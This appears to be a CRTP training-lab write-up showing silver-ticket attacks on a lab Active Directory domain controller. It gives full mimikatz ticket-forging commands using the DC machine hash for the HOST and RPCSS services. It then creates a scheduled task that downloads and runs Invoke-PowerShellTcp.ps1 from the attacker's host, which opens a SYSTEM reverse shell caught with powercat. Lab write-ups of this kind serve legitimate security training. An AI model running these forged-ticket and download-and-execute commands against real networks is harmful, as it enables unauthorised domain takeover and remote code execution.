# CRTP: Hands-On 9

```
• During the additional lab time:
• Try to get command execution on the domain controller by creating silver tickets for:
  – HOST service
  – WMI
```

Index:

  1. [Silver Ticket HOST](#silver-ticket-host)
  2. [Silver Ticket WMI](#silver-ticket-wmi)


## Silver Ticket HOST

Silver ticket for domain controller, should provide managemnt over the HOST service on the domain controller it's posible generate it with the hash of the dcorp-dc machine and with the same technique of the Golden ticket:

```
C:\Windows\system32>C:\AD\Tools\mimikatz.exe "kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /rc4:9407a301944bf60d059322952f56718a /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"

  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 16:49:51
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /rc4:9407a301944bf60d059322952f56718a /startoffset:0 /endin:600 /renewmax:10080 /ptt
User      : Administrator
Domain    : dollarcorp.moneycorp.local (DOLLARCORP)
SID       : S-1-5-21-719815819-3726368948-3917688648
User Id   : 500
Groups Id : *513 512 520 518 519
ServiceKey: 9407a301944bf60d059322952f56718a - rc4_hmac_nt
Service   : HOST
Target    : dcorp-dc.dollarcorp.moneycorp.local
Lifetime  : 5/1/2023 8:33:02 AM ; 5/1/2023 6:33:02 PM ; 5/8/2023 8:33:02 AM
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'Administrator @ dollarcorp.moneycorp.local' successfully submitted for current session

mimikatz(commandline) # exit
Bye!
```
With host privileges, create new scheduled task:

```
C:\Windows\system32>schtasks.exe /create /s dcorp-dc.dollarcorp.moneycorp.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "User162" /TR "powershell.exe -c 'IEX (New-Object Net.webclient).DownloadString(''http://172.16.100.162/Invoke-PowerShellTcp.ps1''')'"
WARNING: The task name "User162" already exists. Do you want to replace it (Y/N)? Y
SUCCESS: The scheduled task "User162" has successfully been created.
```
Listn with Powercat on student machine at port 443 and run the created task:
```
C:\Windows\system32>schtasks.exe /Run /S dcorp-dc.dollarcorp.moneycorp.local /TN "User162"
SUCCESS: Attempted to run the scheduled task "User162".
```
A new reverse shell should be spawned to the local machine, form the dcorp-dc server:

```
 powercat -l -p 443 -v
VERBOSE: Set Stream 1: TCP
VERBOSE: Set Stream 2: Console
VERBOSE: Setting up Stream 1...
VERBOSE: Listening on [0.0.0.0] (port 443)
VERBOSE: Connection from [172.16.2.1] port  [tcp] accepted (source port 52782)
VERBOSE: Setting up Stream 2...
VERBOSE: Both Communication Streams Established. Redirecting Data Between Streams...

Windows PowerShell running as user DCORP-DC$ on DCORP-DC
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Windows\system32>PS C:\Windows\system32>
PS C:\Windows\system32> whoami
nt authority\system
PS C:\Windows\system32> hostname
dcorp-dc
```



## Silver Ticket WMI

In order to use silver ticket  for access using WMI, it's necesary use a couple of tickets. For HOST service and RPCSS service:
```
C:\Windows\system32>C:\AD\Tools\mimikatz.exe "kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /rc4:9407a301944bf60d059322952f56718a /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"

  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 16:49:51
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /rc4:9407a301944bf60d059322952f56718a /startoffset:0 /endin:600 /renewmax:10080 /ptt
User      : Administrator
Domain    : dollarcorp.moneycorp.local (DOLLARCORP)
SID       : S-1-5-21-719815819-3726368948-3917688648
User Id   : 500
Groups Id : *513 512 520 518 519
ServiceKey: 9407a301944bf60d059322952f56718a - rc4_hmac_nt
Service   : HOST
Target    : dcorp-dc.dollarcorp.moneycorp.local
Lifetime  : 5/1/2023 8:45:17 AM ; 5/1/2023 6:45:17 PM ; 5/8/2023 8:45:17 AM
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'Administrator @ dollarcorp.moneycorp.local' successfully submitted for current session

mimikatz(commandline) # exit
Bye!

C:\Windows\system32>C:\AD\Tools\mimikatz.exe "kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /target:dcorp-dc.dollarcorp.moneycorp.local /service:RPCSS /rc4:9407a301944bf60d059322952f56718a /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"

  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 16:49:51
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /target:dcorp-dc.dollarcorp.moneycorp.local /service:RPCSS /rc4:9407a301944bf60d059322952f56718a /startoffset:0 /endin:600 /renewmax:10080 /ptt
User      : Administrator
Domain    : dollarcorp.moneycorp.local (DOLLARCORP)
SID       : S-1-5-21-719815819-3726368948-3917688648
User Id   : 500
Groups Id : *513 512 520 518 519
ServiceKey: 9407a301944bf60d059322952f56718a - rc4_hmac_nt
Service   : RPCSS
Target    : dcorp-dc.dollarcorp.moneycorp.local
Lifetime  : 5/1/2023 8:45:29 AM ; 5/1/2023 6:45:29 PM ; 5/8/2023 8:45:29 AM
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'Administrator @ dollarcorp.moneycorp.local' successfully submitted for current session

mimikatz(commandline) # exit
Bye!
```

Review the ticket:
```
 klist

Current LogonId is 0:0x5136f59

Cached Tickets: (3)

#0>     Client: Administrator @ dollarcorp.moneycorp.local
        Server: RPCSS/dcorp-dc.dollarcorp.moneycorp.local @ dollarcorp.moneycorp.local
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40a00000 -> forwardable renewable pre_authent
        Start Time: 5/1/2023 8:45:29 (local)
        End Time:   5/1/2023 18:45:29 (local)
        Renew Time: 5/8/2023 8:45:29 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0
        Kdc Called:

#1>     Client: Administrator @ dollarcorp.moneycorp.local
        Server: HOST/dcorp-dc.dollarcorp.moneycorp.local @ dollarcorp.moneycorp.local
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40a00000 -> forwardable renewable pre_authent
        Start Time: 5/1/2023 8:45:17 (local)
        End Time:   5/1/2023 18:45:17 (local)
        Renew Time: 5/8/2023 8:45:17 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0
        Kdc Called:
```

Mike an WMI connection to the target domain controller using powershell:

```
gwmi -Class win32_operatingsystem -ComputerName dcorp-dc.dollarcorp.moneycorp.local


SystemDirectory : C:\Windows\system32
Organization    :
BuildNumber     : 20348
RegisteredUser  : Windows User
SerialNumber    : 00454-30000-00000-AA745
Version         : 10.0.20348

```
